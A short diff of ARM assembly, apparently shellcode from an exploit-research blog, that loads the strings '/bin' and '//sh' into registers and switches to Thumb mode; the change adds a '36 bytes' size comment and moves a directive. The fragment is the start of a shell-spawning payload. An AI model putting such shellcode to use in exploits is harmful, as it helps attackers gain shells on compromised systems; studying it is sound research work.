@@ -4,15 +4,17 @@
 
   http://modexp.wordpress.com/   
 */
+    // 36 bytes
+    
     .arch armv6
     .global _start
     .text
 
 _start:
+    .code 32
     ldr    r0, =#0x6e69622f // /bin
     ldr    r1, =#0x68732f2f // //sh
 
-    .code 32
     // switch to thumb mode
     add    r2, pc, #1
     bx     r2
